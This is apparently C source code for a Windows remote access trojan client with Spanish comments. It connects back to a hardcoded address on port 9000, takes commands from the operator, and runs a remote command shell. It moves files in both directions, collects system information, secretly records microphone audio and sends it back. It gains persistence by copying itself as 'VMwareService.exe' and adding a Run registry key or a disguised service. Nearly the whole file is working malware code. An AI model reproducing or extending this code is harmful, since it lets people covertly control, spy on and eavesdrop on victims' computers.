#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>
#include <wchar.h>
#include <locale.h>
#include <shlwapi.h>
#include <Mmsystem.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "../src/base64.c"
#include "../src/sysInfoWin.c"


#define ALIAS "random_str"

// Definiciones
#define SOCKBUFF 2048
#define CMDBUFF 2048

// Variables Globales

// Prototipos
long get_file_size(char* filename);
char* replaceFile(char* command, char* toReplace);
char* startRecord(SOCKET conn); 
char *IsElevated();
void conection();
void ash(int conn);
void _chdir(int conn, char *instruct);
void sendVoiceData(char *filename, SOCKET conn);
void recordAndSave(char *filename);
int mainLoop(int conn);
int excndSend(int conn, char *cmd);
int getPrstnc(int conn, char *method);
int readFile(int conn, char *instruct);
int uploadFunc(char *command, SOCKET conn);


char *IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    if (fRet == 0)
        return "no";
    
    else if (fRet == 1)
        return "yes";
    
}

void recordAndSave(char *filename) {
    char mci_command[SOCKBUFF];
    char ReturnString[SOCKBUFF];
    int mci_error;

    sprintf(mci_command, "open new type waveaudio alias %s", ALIAS);
    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
    if (mci_error != 0) {
        printf("\n0");
    }  
    
    // set the time format
    sprintf(mci_command, "set %s time format ms", ALIAS);    // just set time format
    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);

    // start recording
    sprintf(mci_command, "record %s notify", ALIAS);
    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
    
    Sleep(11000);

    //stop recording
    sprintf(mci_command, "stop %s", ALIAS);
    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);

    // save the file
    sprintf(mci_command, "save %s %s", ALIAS, filename);
    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);

    // close the device
    sprintf(mci_command, "close %s", ALIAS);
    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);


}

long get_file_size(char *filename) {
    struct _stat file_status;
    if (_stat(filename, &file_status) < 0) {
        return -1;
    }
    return file_status.st_size;
}

void readVoiceData(char* file, SOCKET conn) { 
    //char filename[100];
    //snprintf(filename, 100, "%s", file);

    FILE* ptr = fopen(file, "rb");
    
    char buffer[SOCKBUFF];
    memset(buffer, 0, SOCKBUFF);

    size_t bytesRead = 0;
    long file_size = get_file_size(file);
    char file_size_str[100];
    sprintf(file_size_str, "%ld", file_size);

    //snd full size
    send(conn, file_size_str, 100, 0);

    while ((bytesRead = fread(buffer, 1, SOCKBUFF, ptr)) > 0) {
        send(conn, buffer, SOCKBUFF, 0);
    }
 
    fclose(ptr);
    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
}

char *startRecord(SOCKET conn) {
    char* tempdir = getenv("temp");
    char* filename = "se2h.wv";
    char* fullPath = malloc(strlen(tempdir) + strlen(filename) + 1);

    // Construimos ruta
    strcpy(fullPath, tempdir); strcat(fullPath, "\\"); strcat(fullPath, filename);
    
    //char* filename = malloc(strlen(fullPath));

    recordAndSave(fullPath);

    return fullPath;
}


int excndSend(int conn, char *cmd){
    if (strstr(cmd, "exec") != NULL){ 
        char toReplace[] = "exec ";

        char *substr = strstr(cmd, toReplace);
        size_t remainingLength = strlen(substr + strlen(toReplace));
        memmove(cmd, substr + strlen(toReplace), remainingLength + 1);

        if (strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            return 0;
        } 
    }
    
    FILE *xx = NULL;
    char path[1024];

    char fullCmd[CMDBUFF] = "";
    snprintf(fullCmd, sizeof(fullCmd), "%s 2>&1", cmd); 

    xx = _popen(fullCmd, "r");
    if (xx == NULL){
        char error[100] = "Error executing command...";
        send(conn, error, sizeof(error), 0);
        return 1;
    }

    while (fgets(path, sizeof(path), xx) != NULL){
        send(conn, path, strlen(path), 0);
    }

    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
    _pclose(xx);
    return 0;
}

void _chdir(int conn, char *instruct){
    char *directory = malloc(SOCKBUFF + 1);
    char *newDir = malloc(SOCKBUFF + 1);
    memset(directory, 0, strlen(directory));
    memset(newDir, 0, strlen(newDir));

    if (strcmp(instruct, "cd") == 0){
        GetCurrentDirectory(SOCKBUFF + 1, directory);
        send(conn, directory, strlen(directory), 0);
        Sleep(300);
        send(conn, "end\0", strlen("end\0"), 0);
        return;
    }

    char toReplace[] = "cd ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(directory, substr + strlen(toReplace), remainingLength + 1);

    SetCurrentDirectory(directory);
    GetCurrentDirectory(SOCKBUFF + 1, newDir);
    send(conn, newDir, strlen(newDir), 0);

    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
    
    free(directory);
    free(newDir);

}

void ash(int conn)
{
    char cmd[CMDBUFF] = "";

    while (true)
    {
        recv(conn, cmd, sizeof(cmd), 0); 
        if (strcmp(cmd, "q") == 0){
            memset(cmd, 0, SOCKBUFF);
            break;
        } else if (strlen(cmd) == 0)
        {
            continue;
        } else if(strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            memset(cmd, 0, SOCKBUFF);
        } else {
            excndSend(conn, cmd);
            // Limpiar comando recibido
            memset(cmd, 0, SOCKBUFF);
        }
    }
    Sleep(500); 
    return;
}

int readFile(int conn, char *instruct){
    char *filename = replaceFile(instruct, "download ");
    long fullBytes = get_file_size(filename);

    char fullBytesStr[100];
    snprintf(fullBytesStr, 100, "%ld", fullBytes);
    send(conn, fullBytesStr, strlen(fullBytesStr), 0);
    Sleep(300);

    if (fullBytes == -1){
        send(conn, "-1", 2, 0);
        return 1;
    }

    FILE *fp;
    fp = fopen(filename, "rb");

    char readData[SOCKBUFF];
    long bytesRead = 0;

    while (true){
        if ((bytesRead = fread(readData, 1, SOCKBUFF - 1, fp)) <= 0)
            break;

        readData[bytesRead] = '\0';
        send(conn, (char *)readData, bytesRead, 0);
        memset(readData, 0, SOCKBUFF);
    }

    fclose(fp);
    Sleep(400);
    //send(conn, "end\0", strlen("end\0"), 0); 
    return 0;

}

char* replaceFile(char* command, char* toReplace) {
    char* file = malloc(strlen(command) + 1); // Asigna memoria a 'file'

    char* substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    file[remainingLength] = '\0';

    return file;
}

int uploadFunc(char* command, SOCKET conn) {
    // Encontrar nombre de base (NO RUTA COMPLETA)
    char* basename = PathFindFileName(replaceFile(command, "upload "));

    FILE* fp;
    fp = fopen(basename, "wb");

    unsigned char recvData[SOCKBUFF];
    size_t bytesRead;

    while (true) {
        bytesRead = recv(conn, (char *)recvData, SOCKBUFF, 0);
        
        if (strcmp((char *)recvData, "end\0") == 0)
            break;

        fwrite(recvData, 1, bytesRead, fp);
        //fwrite(base64_decode(recvData, bytesRead, &bytesRead), 1, bytesRead, fp);
        memset(recvData, 0, SOCKBUFF);
        
    }

    fclose(fp);

}

int getPrstnc(int conn, char *method){
    char* appdata = getenv("APPDATA");
    char* vm_service = "\\VMwareService.exe";
    char* lction = malloc(strlen(appdata) + strlen(vm_service) + 1);
    strcpy(lction, appdata);
    strcat(lction, vm_service);

    if (lction == NULL){
        send(conn, "error", SOCKBUFF, 0);
        return 1;

    } else {
        char path[255];
        GetModuleFileName(NULL, path, 255);
        BOOL reslt = CopyFile(path, lction, FALSE);

        if (!reslt) {
            send(conn, "error", SOCKBUFF, 0);
            return 1;

        } else {
            char* formed = malloc(2048 * sizeof(char));
            if (strcmp(method, "low") == 0)
                snprintf(formed, SOCKBUFF, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MService /t REG_SZ /d %s /f", lction);
            
            else if(strcmp(method, "high") == 0){

                if (strstr("yes", IsElevated()) != NULL)
                    snprintf(formed, SOCKBUFF, "sc create \"VMware Service\" binpath= \"%s service\" start= auto", lction);
                
                else {
                    send(conn, "permissonError", strlen("permissonError"), 0);
                    return 1;
                }
            }

            WinExec(formed, SW_HIDE);
            send(conn, "exito", strlen("exito"), 0);
            return 0;    
        }
    
    }
}


int mainLoop(int conn){
    char instruct[SOCKBUFF];
    while (true){
        memset(instruct, 0, SOCKBUFF);
        recv(conn, instruct, sizeof(instruct), 0); 

        if (strcmp(instruct, "exit") == 0)
            return 0;

        else if (strcmp(instruct, "exit -y") == 0) {
            exit(0);
        }
        else if (strcmp(instruct, "shell") == 0)
            ash(conn);

        else if (strstr(instruct, "download ") != NULL){
            readFile(conn, instruct);
        }
        else if (strstr(instruct, "exec") != NULL)
            excndSend(conn, instruct);

        else if (strstr(instruct, "upload") != NULL)
            uploadFunc(instruct, conn);

        else if (strcmp(instruct, "sysinfo") == 0){
            strtAll(conn);
            //send(conn, "end\0", strlen("end\0"), 0);
        } 
        
        else if (strcmp(instruct, "lowpersistence") == 0) {
            getPrstnc(conn, "low");
            Sleep(300);

        }
        else if (strcmp(instruct, "persistence") == 0) {
            getPrstnc(conn, "high");
            Sleep(300);

        }
        else if (strcmp(instruct, "check") == 0)
            send(conn, IsElevated(), strlen(IsElevated()), 0);

        else if (strcmp(instruct, "record") == 0){
            char *file = startRecord(conn); 
            readVoiceData(file, conn);
        }
        else
            continue;
    }
    return 0;
}

void conection()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
        exit(1);
    }

    // Geberabanis el socket
    int conn = socket(AF_INET, SOCK_STREAM, 0);

    // Generamos estructura de datos
    struct sockaddr_in cltAddr;

    cltAddr.sin_family = AF_INET;
    cltAddr.sin_port = htons(9000); // Especifcamos puerto
    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.33"); // Especifcamos IP

    int targetConnStatus = connect(conn, (struct sockaddr *)&cltAddr,
                                   sizeof(cltAddr));

    if (targetConnStatus == -1){
        Sleep(10000);
        conection();
        // printf("%s[!>] %sERROR...\n", YELLOW, RED);
    }
    else{
        mainLoop(conn);
        Sleep(10000);
        conection();
    }
}
